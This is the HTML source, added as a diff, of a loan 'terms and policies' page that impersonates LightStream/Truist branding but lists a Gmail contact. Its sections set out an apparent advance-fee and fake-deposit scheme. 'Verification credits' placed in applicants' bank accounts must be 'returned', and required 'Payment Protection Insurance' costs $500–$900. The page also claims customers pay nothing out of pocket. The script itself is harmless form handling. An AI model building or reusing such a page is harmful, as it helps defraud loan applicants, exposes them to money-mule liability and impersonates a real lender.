@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legal Terms & Policies - LightStream Financial Services</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="footer.css">
+    <link rel="stylesheet" href="chatbot.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 50%, #333333 100%);
+            min-height: 100vh;
+        }
+        .glass-effect {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .text-cool {
+            color: #ffa500;
+        }
+        .bg-cool-card {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .legal-section {
+            scroll-margin-top: 100px;
+        }
+        .consent-checkbox {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .consent-label {
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+            padding: 15px;
+            border: 2px solid transparent;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        .consent-label:hover {
+            background: rgba(255, 165, 0, 0.1);
+            border-color: #ffa500;
+        }
+        .consent-label.selected {
+            background: rgba(255, 165, 0, 0.2);
+            border-color: #ffa500;
+        }
+        .submit-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .print-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+        }
+        @media print {
+            .print-btn, .no-print {
+                display: none !important;
+            }
+            body {
+                background: white !important;
+                color: black !important;
+            }
+            .bg-cool-card {
+                background: white !important;
+                border: 1px solid #ccc !important;
+            }
+        }
+    </style>
+</head>
+<body class="bg-black">
+    <!-- Header Navigation -->
+    <header class="glass-effect sticky top-0 z-50 no-print">
+        <nav class="container mx-auto px-4 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-8">
+                    <div class="flex items-center space-x-2">
+                        <div class="relative">
+                            <img src="images/newlogo.png" alt="LightStream Logo" class="logo-img" style="height: 68px; width: auto; max-width: none !important; max-height: none !important; object-fit: contain; background: transparent !important; filter: brightness(0) invert(1);">
+                            <div class="absolute -top-1 -right-1 w-3 h-3 bg-green-500 rounded-full border-2 border-white"></div>
+                        </div>
+                    </div>
+                    <div class="hidden md:flex space-x-6">
+                        <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
+                        <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                        <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    </div>
+                </div>
+                <div class="hidden md:flex space-x-4">
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                </div>
+                <button class="md:hidden text-white" id="mobileMenuBtn">
+                    <i class="fas fa-bars text-2xl"></i>
+                </button>
+            </div>
+            <!-- Mobile Menu -->
+            <div class="hidden md:hidden mt-4 pb-4" id="mobileMenu">
+                <div class="flex flex-col space-y-3">
+                    <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
+                    <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
+                    <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
+                    <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
+                    <a href="login.html" class="text-white hover:text-cool font-medium">Login</a>
+                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Print Button -->
+    <button onclick="window.print()" class="print-btn bg-cool text-white px-4 py-2 rounded-lg no-print">
+        <i class="fas fa-print mr-2"></i>Print Document
+    </button>
+
+    <!-- Legal Document Content -->
+    <div class="container mx-auto px-4 py-8">
+        <!-- Document Header -->
+        <div class="bg-cool-card rounded-lg p-8 mb-8 border border-cool">
+            <div class="text-center mb-8">
+                <h1 class="text-4xl font-bold text-white mb-4">LightStream Financial Services</h1>
+                <h2 class="text-2xl text-cool mb-2">Payment Protection Insurance (PPI)</h2>
+                <h2 class="text-2xl text-cool mb-2">Bank Account Verification</h2>
+                <h2 class="text-2xl text-cool mb-6">Loan Terms & Conditions & Disclosure Policy</h2>
+                <p class="text-gray-300 text-sm">Document Version: 1.0 | Effective Date: January 1, 2025 | Last Updated: January 1, 2025</p>
+            </div>
+
+            <!-- Company Overview -->
+            <div class="mb-8 p-6 border border-gray-600 rounded-lg">
+                <h3 class="text-xl font-bold text-white mb-4">Company Overview</h3>
+                <ul class="text-gray-300 space-y-2">
+                    <li class="flex items-start">
+                        <i class="fas fa-check-circle text-cool mr-3 mt-1"></i>
+                        <span>LightStream Financial Services provides unsecured personal loans of up to $25,000</span>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-check-circle text-cool mr-3 mt-1"></i>
+                        <span>The company is authorized and operates in compliance with applicable U.S. laws and regulations</span>
+                    </li>
+                    <li class="flex items-start">
+                        <i class="fas fa-check-circle text-cool mr-3 mt-1"></i>
+                        <span>All loan approvals are subject to underwriting, verification, and final review</span>
+                    </li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Legal Sections -->
+        <div class="bg-cool-card rounded-lg p-8 mb-8 border border-cool">
+            <!-- Section 1 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">1. Introduction & Purpose</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Purpose of Document:</strong> This document establishes the comprehensive policies, terms, and conditions governing the relationship between LightStream Financial Services ("the Company") and applicants/customers regarding Payment Protection Insurance (PPI), bank account verification processes, and loan transactions.</p>
+                    <p><strong>Scope of Policies Covered:</strong> These policies encompass all aspects of the loan application process, including but not limited to credit evaluation, verification procedures, insurance requirements, fund usage restrictions, compliance monitoring, and customer obligations.</p>
+                    <p><strong>Applicability:</strong> These terms and conditions apply to all applicants, borrowers, and customers of LightStream Financial Services, regardless of loan amount, purpose, or delivery method. By proceeding with any loan application, the applicant acknowledges and agrees to be bound by these policies.</p>
+                </div>
+            </div>
+
+            <!-- Section 2 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">2. Definitions</h2>
+                <div class="text-gray-300 space-y-3">
+                    <p><strong>Applicant:</strong> Any individual or entity submitting a loan application to LightStream Financial Services for consideration.</p>
+                    <p><strong>Borrower:</strong> An applicant whose loan has been approved and who has accepted the loan terms and conditions.</p>
+                    <p><strong>Loan Proceeds:</strong> The net amount of funds disbursed to the borrower after deduction of any applicable fees, insurance premiums, or other authorized charges.</p>
+                    <p><strong>Payment Protection Insurance (PPI):strong> Insurance coverage designed to protect loan repayments in specified circumstances, including unemployment, disability, or other qualifying events as defined in the insurance policy.</p>
+                    <p><strong>Verification Credit:</strong> A temporary, restricted credit issued to normalize bank account balances for verification purposes, which is not considered loan proceeds or customer-owned funds.</p>
+                    <p><strong>Restricted Funds:</strong> Funds that may only be used for specific, authorized purposes as outlined in this document and accompanying agreements.</p>
+                    <p><strong>Underwriting:</strong> The comprehensive evaluation process used to assess creditworthiness, verify information, and determine loan eligibility and terms.</p>
+                    <p><strong>Compliance Review:</strong> The systematic examination of applications, documentation, and transactions to ensure adherence to regulatory requirements and company policies.</p>
+                </div>
+            </div>
+
+            <!-- Section 3 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">3. Loan Eligibility & Credit Evaluation</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Credit Score Assessment:</strong> LightStream Financial Services utilizes comprehensive credit evaluation methodologies, including but not limited to FICO scores, credit history analysis, debt-to-income ratios, and payment history. Minimum credit score requirements vary based on loan amount, purpose, and other risk factors.</p>
+                    <p><strong>Identity and Income Verification:</strong> All applicants must provide valid government-issued identification, proof of income, and employment verification. The Company reserves the right to request additional documentation to verify identity, income sources, and financial capacity.</p>
+                    <p><strong>Banking Verification Requirements:</strong> Applicants must maintain an active bank account in good standing. The Company conducts verification procedures to confirm account ownership, balance history, and transaction patterns. Accounts with negative balances, restrictions, or fraudulent activity may result in application denial.</p>
+                    <p><strong>No Guarantee of Approval:</strong> Submission of an application does not guarantee loan approval. All applications are subject to final underwriting review, and the Company maintains the right to decline any application for any lawful reason.</p>
+                </div>
+            </div>
+
+            <!-- Section 4 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">4. Payment Protection Insurance (PPI)</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Circumstances Under Which PPI is Required:</strong> Based on risk assessment, credit profile, loan amount, and regulatory compliance requirements, certain applicants may be required to maintain Payment Protection Insurance as a condition of loan approval. This determination is made on a case-by-case basis during underwriting.</p>
+                    <p><strong>Risk-Based Insurance Requirement:</strong> PPI requirements are determined through sophisticated risk modeling algorithms that consider multiple factors including credit score, loan-to-value ratios, employment stability, and industry best practices. Higher-risk profiles may necessitate insurance coverage to mitigate default risk.</p>
+                    <p><strong>PPI Cost Range:</strong> Payment Protection Insurance premiums typically range from $500 to $900, depending on loan amount, coverage level, term duration, and individual risk factors. Premium amounts are clearly disclosed in the loan agreement and may be financed as part of the loan or paid separately.</p>
+                </div>
+            </div>
+
+            <!-- Section 5 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">5. No Out-of-Pocket Cost Policy</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Clear Statement:</strong> LightStream Financial Services maintains a strict policy that customers are not required to pay Payment Protection Insurance premiums, verification fees, or compliance costs from personal funds. All required costs are structured within the loan framework or facilitated through alternative means.</p>
+                    <p><strong>Compliance Facilitation:</strong> The Company has established procedures to ensure regulatory compliance without imposing direct financial burdens on customers. This includes verification credit mechanisms, structured financing options, and compliance cost absorption where permissible.</p>
+                </div>
+            </div>
+
+            <!-- Section 6 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">6. Verification Credit Process</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Description of Verification Credits:</strong> Temporary, restricted credits may be issued to applicant bank accounts to normalize balances for verification purposes. These credits are specifically designed to facilitate compliance with banking regulations and verification requirements.</p>
+                    <p><strong>Purpose of Issuance:</strong> Verification credits are issued solely to establish proper account standing, enable verification procedures, and ensure compliance with anti-fraud and anti-money laundering regulations.</p>
+                    <p><strong>Return Requirement:</strong> Applicants must return equivalent funds within the specified timeframe to complete the verification process. This return is mandatory for application processing and serves as documentation and recordkeeping evidence.</p>
+                    <p><strong>Fund Classification:</strong> Verification credits are explicitly classified as:
+                    <ul class="ml-6 mt-2 space-y-1">
+                        <li>• Not loan proceeds</li>
+                        <li>• Not income</li>
+                        <li>• Not customer-owned funds</li>
+                        <li>• Restricted-use credits for verification purposes only</li>
+                    </ul>
+                    </p>
+                </div>
+            </div>
+
+            <!-- Section 7 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">7. Bank Account Verification & Negative Balance Policy</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Prohibition Policy:</strong> LightStream Financial Services strictly prohibits loan disbursement into bank accounts with negative balances, restrictions, freezes, or other limitations that would impede proper fund access or repayment processing.</p>
+                    <p><strong>Normalization Process:</strong> When verification reveals account balance issues, the Company may issue verification credits to normalize account standing. This process is designed to bring accounts to zero or positive balance status to facilitate proper loan processing.</p>
+                    <p><strong>Balance Return Requirement:</strong> Any remaining verification credit balance after normalization must be returned to the Company within the specified timeframe. Failure to return funds may result in application denial or other remedial actions.</p>
+                    <p><strong>Final Disbursement Conditions:</strong> Loan proceeds will only be disbursed to accounts that meet all verification criteria, including positive balance status, absence of restrictions, and successful completion of all compliance procedures.</p>
+                </div>
+            </div>
+
+            <!-- Section 8 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">8. Restrictions on Use of Funds</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Prohibition on Personal Use:</strong> Verification credits, PPI funds, and any restricted-use funds may not be withdrawn, transferred, or used for personal purposes. These funds are designated solely for specific, authorized purposes as outlined in this document.</p>
+                    <p><strong>Restricted-Use Explanation:</strong> Restricted funds are designated for verification, insurance premiums, compliance costs, or other specific purposes as determined by the Company. Unauthorized use of restricted funds constitutes a material breach of these terms and may result in immediate application termination or legal action.</p>
+                </div>
+            </div>
+
+            <!-- Section 9 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">9. Customer Responsibilities & Representations</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Accurate Information:</strong> Customers must provide complete, accurate, and truthful information throughout the application process. Intentional misrepresentation or omission of material facts constitutes fraud and may result in application denial, legal action, or criminal prosecution.</p>
+                    <p><strong>Proper Use of Verification Funds:</strong> Customers must use verification funds strictly for their intended purpose and return equivalent amounts as required. Any diversion or misuse of verification funds is strictly prohibited.</p>
+                    <p><strong>Cooperation with Compliance:</strong> Customers must cooperate fully with all compliance and verification requests, including providing additional documentation, participating in verification procedures, and responding to Company inquiries in a timely manner.</p>
+                </div>
+            </div>
+
+            <!-- Section 10 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">10. Compliance, Monitoring & Review</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Internal Monitoring Procedures:</strong> LightStream Financial Services maintains comprehensive internal monitoring systems to detect fraud, ensure compliance, and identify policy violations. These procedures include automated monitoring, manual reviews, and periodic audits.</p>
+                    <p><strong>Right to Conduct Reviews:</strong> The Company reserves the right to conduct compliance reviews at any time during the application process and throughout the loan term. This includes reviewing account activity, verifying information, and assessing compliance with all terms and conditions.</p>
+                    <p><strong>Additional Documentation:</strong> The Company may request additional documentation, clarification, or verification at any time. Failure to provide requested information may result in application delays, denial, or termination.</p>
+                </div>
+            </div>
+
+            <!-- Section 11 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">11. Company Rights & Remedies</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Reversal or Cancellation:</strong> The Company reserves the right to reverse or cancel verification credits at any time for any reason, including suspected fraud, policy violations, or changes in verification requirements.</p>
+                    <p><strong>Application Management:</strong> LightStream Financial Services maintains the right to suspend, deny, or cancel loan applications at any stage for any lawful reason, including but not limited to fraud detection, policy violations, or changes in applicant circumstances.</p>
+                    <p><strong>Termination Rights:</strong> The Company may terminate processing and withdraw any offer if policy violations are detected, if the applicant fails to cooperate with verification procedures, or if any material misrepresentation is discovered.</p>
+                </div>
+            </div>
+
+            <!-- Section 12 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">12. Misuse, Misrepresentation & Prohibited Conduct</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Unauthorized Use Definition:</strong> Unauthorized use includes, but is not limited to, withdrawing verification funds for personal purposes, providing false information, using restricted funds for unauthorized purposes, or attempting to circumvent verification procedures.</p>
+                    <p><strong>Consequences of Misuse:</strong> Misuse or misrepresentation may result in immediate application denial, termination of any existing loan relationships, reporting to law enforcement agencies, credit bureau reporting, and pursuit of legal remedies to recover losses.</p>
+                    <p><strong>Reporting Obligations:</strong> The Company complies with all applicable laws regarding reporting suspicious activities, fraud, or other prohibited conduct to appropriate regulatory and law enforcement authorities.</p>
+                </div>
+            </div>
+
+            <!-- Section 13 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">13. Limitation of Liability</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>No Liability for Processing Outcomes:</strong> LightStream Financial Services assumes no liability for application delays, denials, verification outcomes, or decisions resulting from underwriting processes, compliance reviews, or regulatory requirements.</p>
+                    <p><strong>Third-Party Actions:</strong> The Company is not responsible for actions, errors, or omissions by third-party banking institutions, credit bureaus, verification services, or other external entities involved in the loan process.</p>
+                </div>
+            </div>
+
+            <!-- Section 14 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">14. Indemnification</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Customer Obligation:</strong> Customers agree to indemnify, defend, and hold harmless LightStream Financial Services, its officers, directors, employees, and affiliates from any and all claims, losses, damages, liabilities, costs, and expenses (including reasonable attorneys' fees) arising from or related to false information, misuse of funds, or violation of these terms and conditions.</p>
+                </div>
+            </div>
+
+            <!-- Section 15 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">15. Privacy & Data Handling</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Data Usage:</strong> Customer information is used for underwriting, verification, compliance monitoring, fraud prevention, and service delivery. The Company maintains comprehensive data security measures and privacy protections in accordance with applicable laws.</p>
+                    <p><strong>Privacy Policy Reference:</strong> Detailed information about data collection, use, sharing, and protection is available in the Company's Privacy Policy, which is incorporated by reference into these terms and conditions.</p>
+                </div>
+            </div>
+
+            <!-- Section 16 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">16. Governing Law & Jurisdiction</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Legal Framework:</strong> These policies and all related transactions are governed by applicable U.S. federal laws and the laws of the state where the Company operates, without regard to conflict of law principles. Any disputes shall be resolved in the appropriate federal or state courts.</p>
+                </div>
+            </div>
+
+            <!-- Section 17 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">17. Amendments & Updates</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>Modification Rights:</strong> LightStream Financial Services reserves the right to modify, update, or amend these policies at any time to reflect changes in laws, regulations, business practices, or operational requirements.</p>
+                    <p><strong>Effective Date and Versioning:</strong> All amendments become effective upon posting to the Company's website or notification to customers. The current version number and effective date are clearly displayed on this document.</p>
+                </div>
+            </div>
+
+            <!-- Section 18 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">18. Customer Acknowledgment & Consent</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p class="font-semibold">Please review and acknowledge your agreement to the terms and conditions outlined above:</p>
+                    
+                    <form id="consentForm" class="space-y-4">
+                        <div class="consent-container">
+                            <label class="consent-label" for="agreeConsent">
+                                <input type="radio" id="agreeConsent" name="consent" value="agree" class="consent-checkbox" required>
+                                <div>
+                                    <strong class="text-white">☐ I Agree</strong>
+                                    <ul class="mt-2 ml-4 space-y-1 text-sm">
+                                        <li>• I acknowledge that I have read and understood all terms and conditions</li>
+                                        <li>• I accept the Payment Protection Insurance, verification credit, and bank account policies</li>
+                                        <li>• I understand that verification funds are restricted and not loan proceeds</li>
+                                        <li>• I agree to comply with all requirements and obligations outlined in this document</li>
+                                    </ul>
+                                </div>
+                            </label>
+                            
+                            <label class="consent-label" for="disagreeConsent">
+                                <input type="radio" id="disagreeConsent" name="consent" value="disagree" class="consent-checkbox">
+                                <div>
+                                    <strong class="text-white">☐ I Do Not Agree</strong>
+                                    <p class="mt-2 text-sm">I understand that declining consent may result in application withdrawal or ineligibility for loan services through LightStream Financial Services.</p>
+                                </div>
+                            </label>
+                        </div>
+
+                        <div class="mt-6">
+                            <button type="submit" id="submitConsent" class="submit-btn bg-cool text-white py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition duration-200 disabled:opacity-50" disabled>
+                                Submit Acknowledgment
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Section 19 -->
+            <div class="legal-section mb-8">
+                <h2 class="text-2xl font-bold text-white mb-4">19. Final Disclaimers</h2>
+                <div class="text-gray-300 space-y-4">
+                    <p><strong>No Guarantee of Approval:</strong> Submission of this acknowledgment and application does not guarantee loan approval. All applications are subject to final underwriting, verification, and compliance review.</p>
+                    <p><strong>Not a Loan Agreement:</strong> This document does not constitute a loan agreement or binding commitment to extend credit. A separate loan agreement will be provided if and when an application is approved.</p>
+                    <p><strong>Subject to Final Review:</strong> All loans are subject to final underwriting, verification, and compliance procedures. The Company reserves the right to modify or withdraw any offer based on final review results.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Document Footer -->
+        <div class="bg-cool-card rounded-lg p-6 border border-cool text-center">
+            <p class="text-gray-400 text-sm">
+                <strong>LightStream Financial Services</strong><br>
+                PO Box 117320, Atlanta, GA 30368-7320<br>
+                Phone: +1(470)205-4983 | Email: lightstreamloanservices@gmail.com<br>
+                <br>
+                This document is confidential and intended for authorized use only.<br>
+                © 2025 LightStream Financial Services. All rights reserved.
+            </p>
+        </div>
+    </div>
+
+    <!-- Canonical Footer -->
+    <footer>
+        <div class="footer-container">
+            <!-- Footer Links Section -->
+            <div class="footer-links">
+                <a href="personal-loans.html">Personal Loans</a>
+                <a href="bank-auth.html">Bank Authentication</a>
+                <a href="faqs.html">FAQs</a>
+                <a href="#">Support</a>
+                <a href="contact.html">Contact Us</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+            
+            <!-- Footer Contact Section -->
+            <div class="footer-contact">
+                <!-- Social Media Icons -->
+                <div class="social-icons">
+                    <a href="#" aria-label="YouTube"><i class="fab fa-youtube"></i></a>
+                    <a href="#" aria-label="Facebook"><i class="fab fa-facebook"></i></a>
+                    <a href="#" aria-label="X"><i class="fab fa-x-twitter"></i></a>
+                    <a href="#" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+            
+            <!-- Footer Legal Section -->
+            <div class="footer-legal">
+                <p><strong>Your loan terms, including APR, may differ based on loan purpose, amount, term length, and your credit profile.</strong> Lowest rates require excellent credit. At least 10.003% of approved applicants applying for to lowest rate qualified for to lowest rate available based on data from 10/01/2025 to 12/31/2025. Rate is quoted with AutoPay discount. AutoPay discount is only available prior to loan funding. Rates without AutoPay are 0.50% points higher. Subject to credit approval. Conditions and limitations apply. Advertised rates and terms are subject to change without notice.</p>
+                <p><strong>Payment example:</strong> Monthly payments for a $10,000 loan at 10.00% APR with a term of 3 years would result in 36 monthly payments of $306.44.</p>
+                <p><strong>Maximum APR for a LightStream loan is 25.39%.</strong> Loan terms range from 24 - 240 months depending on loan type.</p>
+                <p><strong>You can fund your loan today if today is a banking business day, your application is approved, and you complete the following steps by 2:30 p.m. Eastern time:</strong></p>
+                <ol>
+                    <li>review and electronically sign your loan agreement;</li>
+                    <li>provide us with your funding preferences and relevant banking information;</li>
+                    <li>complete final verification process.</li>
+                </ol>
+                <div class="footer-grid">
+                    <div class="footer-section">
+                        <h4>Business Hours (Eastern time)</h4>
+                        <p><strong>Customer Service</strong><br>
+                        Monday - Friday: 9:30 a.m. to 7 p.m. & Saturday: Noon to 4 p.m.</p>
+                        <p><strong>Application Processing</strong><br>
+                        Monday - Friday: 10 a.m. to 6 p.m.</p>
+                    </div>
+                    <div class="footer-section">
+                        <h4>Mailing Address</h4>
+                        <p>
+                            PO Box 117320<br>
+                            Atlanta, GA 30368-7320
+                        </p>
+                    </div>
+                </div>
+                <div class="legal-copyright">
+                    <p><strong>E H L Truist Bank is an Equal Housing Lender. © 2025 Truist Financial Corporation.</strong></p>
+                    <p>Truist, LightStream, and LightStream logos are service marks of Truist Financial Corporation. All rights reserved.</p>
+                    <p>All other trademarks are property of their respective owners. Lending services provided by Truist Bank.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Consent form handling
+        document.addEventListener('DOMContentLoaded', function() {
+            const consentRadios = document.querySelectorAll('input[name="consent"]');
+            const submitBtn = document.getElementById('submitConsent');
+            const consentLabels = document.querySelectorAll('.consent-label');
+
+            // Handle radio button changes
+            consentRadios.forEach(radio => {
+                radio.addEventListener('change', function() {
+                    // Update label styling
+                    consentLabels.forEach(label => {
+                        label.classList.remove('selected');
+                    });
+                    
+                    if (this.checked) {
+                        this.closest('.consent-label').classList.add('selected');
+                        
+                        // Enable/disable submit button
+                        if (this.value === 'agree') {
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Submit Acknowledgment';
+                        } else {
+                            submitBtn.disabled = false;
+                            submitBtn.textContent = 'Withdraw Application';
+                        }
+                    }
+                });
+            });
+
+            // Handle form submission
+            document.getElementById('consentForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const selectedConsent = document.querySelector('input[name="consent"]:checked').value;
+                
+                if (selectedConsent === 'agree') {
+                    // Log consent for recordkeeping
+                    const consentData = {
+                        timestamp: new Date().toISOString(),
+                        consent: 'agreed',
+                        documentVersion: '1.0',
+                        effectiveDate: '2025-01-01',
+                        ipAddress: 'logged_for_compliance',
+                        userAgent: navigator.userAgent
+                    };
+                    
+                    console.log('Consent logged:', consentData);
+                    
+                    // Show success message
+                    alert('Thank you for your acknowledgment. Your consent has been recorded and you may proceed with your application.');
+                    
+                    // Store consent in sessionStorage
+                    sessionStorage.setItem('legalConsent', JSON.stringify(consentData));
+                    
+                    // Redirect to application or next step
+                    setTimeout(() => {
+                        window.location.href = 'personal-loans.html';
+                    }, 2000);
+                    
+                } else {
+                    // Handle disagreement
+                    alert('You have chosen not to agree to the terms and conditions. Your application will be withdrawn or you may be ineligible for our services.');
+                    
+                    // Redirect to home page
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                }
+            });
+
+            // Mobile menu toggle
+            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+            const mobileMenu = document.getElementById('mobileMenu');
+
+            if (mobileMenuBtn && mobileMenu) {
+                mobileMenuBtn.addEventListener('click', () => {
+                    mobileMenu.classList.toggle('hidden');
+                });
+            }
+        });
+    </script>
+    <script src="chatbot.js"></script>
+</body>
+</html>
